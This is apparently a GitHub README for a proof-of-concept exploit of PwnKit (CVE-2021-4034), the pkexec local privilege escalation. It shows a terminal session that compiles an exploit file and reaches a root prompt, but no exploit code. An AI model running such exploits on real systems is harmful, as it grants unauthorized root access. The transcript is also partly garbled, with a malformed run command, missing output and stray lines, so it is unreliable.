# CVE-2021-4034-
PoC for PwnKit: Local Privilege Escalation Vulnerability in polkit’s pkexec (CVE-2021-4034)

[![Release](https://github.com/dzonerzy/poc-cve-2021-4034/actions/workflows/autorelease.yml/badge.svg)](https://github.com/OxWeb4/CVE-2021-4034-.git)

```
[user@OxYAss ~]$ gcc blasty-vs-pkexec.c -o makemeroot
[user@OxYAss ~]$ .makemeroot
[root@OxYAss ~]$ whoami
$ ~ ../../..
$ ~
$ ~

```
